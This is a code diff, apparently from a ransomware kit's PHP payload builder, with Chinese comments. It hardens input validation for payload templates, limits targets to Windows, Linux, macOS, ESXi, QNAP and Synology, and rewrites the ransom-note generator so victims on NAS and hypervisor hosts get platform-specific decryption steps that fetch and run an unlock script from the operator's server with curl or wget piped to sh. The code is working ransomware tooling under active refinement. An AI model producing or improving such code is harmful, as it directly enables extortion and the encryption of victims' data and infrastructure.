@@ -23,7 +23,7 @@ if (!preg_match('#^https?://[A-Za-z0-9._\-]+(:\d{1,5})?(/[A-Za-z0-9._\-]*)*$#', 
 // 允许常见口令字符，但必须排除会破坏载荷模板字符串字面量的字符：
 // ' " ` \ 以及空白/换行 —— 模板里是 SECRET='{{HANDSHAKE}}'（sh/Python）或
 // SECRET="{{HANDSHAKE}}"（C#），放开这些就等于允许注入代码。
-if (!preg_match('/^[A-Za-z0-9_\-@.!$%&*+=]{1,64}.$/', $secret)) {
+if (!preg_match('/^[A-Za-z0-9_\-@.!$%&*+=]{1,64}$/', $secret)) {
     echo json_encode(['ok'=>false,'msg'=>'握手密钥只能包含字母、数字及 - _ @ . ! $ % & * + = （1-64 位，不能有引号/反斜杠/空格）']); exit;
 }
 
@@ -40,7 +40,7 @@ $ransom = [
 
 // NAS 只加密数据卷，绝不含系统分区
 $valid = ['win','linux','macos','esxi','qnap','synology'];
-if (!in_array($platform, $valid)) { echo json_encode(['ok'=>false,'msg'=>'无效平台']); exit; }
+if (!in_array($platform, $valid, true)) { echo json_encode(['ok'=>false,'msg'=>'无效平台']); exit; }
 
 $out_dir = __DIR__ . '/payloads';
 if (!is_dir($out_dir)) mkdir($out_dir, 0750, true);
@@ -114,12 +114,27 @@ function build_ransom_note($r, $plat, $c2='') {
     if ($srv === '') $srv = 'http://<后台地址>';
     // 解密一律走零依赖脚本：Linux/macOS 用 jasmin_unlock.sh (纯 openssl)，
     // Windows 用 jasmin_unlock.ps1 (纯 PowerShell 7+，无需编译 exe)
-    $dec = ($plat === 'win')
-        ? "Windows (requires PowerShell 7+)\n"
-         ."  curl.exe -sL {$srv}/payloads/jasmin_unlock.ps1 -o unlock.ps1\n"
-         ."  pwsh -File unlock.ps1 -Server {$srv} -K \"<passphrase>\""
-        : "Linux / macOS (pure openssl, no dependencies required)\n"
-         ."  curl -sL {$srv}/payloads/jasmin_unlock.sh | sh -s {$srv} \"<passphrase>\"";
+    // 三个 sh 平台（esxi / qnap / synology）都靠 SSH 进设备后用同一个零依赖脚本。
+    // 此前它们和 linux/macos 一起落进 else，勒索信上会写 "Linux / macOS" ——
+    // 对着一台 NAS 或 ESXi 主机教受害者用错的方法。
+    if ($plat === 'win') {
+        $dec = "Windows (requires PowerShell 7+)\n"
+              ."  curl.exe -sL {$srv}/payloads/jasmin_unlock.ps1 -o unlock.ps1\n"
+              ."  pwsh -File unlock.ps1 -Server {$srv} -K \"<passphrase>\"";
+    } elseif (in_array($plat, ['esxi','qnap','synology'], true)) {
+        $how = [
+            'esxi'     => 'SSH into the ESXi host (Host > Manage > Services > TSM-SSH)',
+            'qnap'     => 'first enable SSH: QNAP Control Panel > Network & File Services',
+            'synology' => 'first enable SSH: Synology Control Panel > Terminal & SNMP',
+        ][$plat];
+        $dec = "NAS / hypervisor host - POSIX shell (pure openssl, no dependencies required)\n"
+              ."  # {$how}\n"
+              ."  curl -sL {$srv}/payloads/jasmin_unlock.sh | sh -s {$srv} \"<passphrase>\"\n"
+              ."  # if curl is unavailable:  wget -qO- {$srv}/payloads/jasmin_unlock.sh | sh -s {$srv} \"<passphrase>\"";
+    } else {
+        $dec = "Linux / macOS (pure openssl, no dependencies required)\n"
+              ."  curl -sL {$srv}/payloads/jasmin_unlock.sh | sh -s {$srv} \"<passphrase>\"";
+    }
     $dec.= "\n  (Decrypts ALL encrypted files by default; append specific folders to limit scope)";
     $n = "╔══════════════════════════════════════════╗\n";
     $n.= "║  {$t}\n";
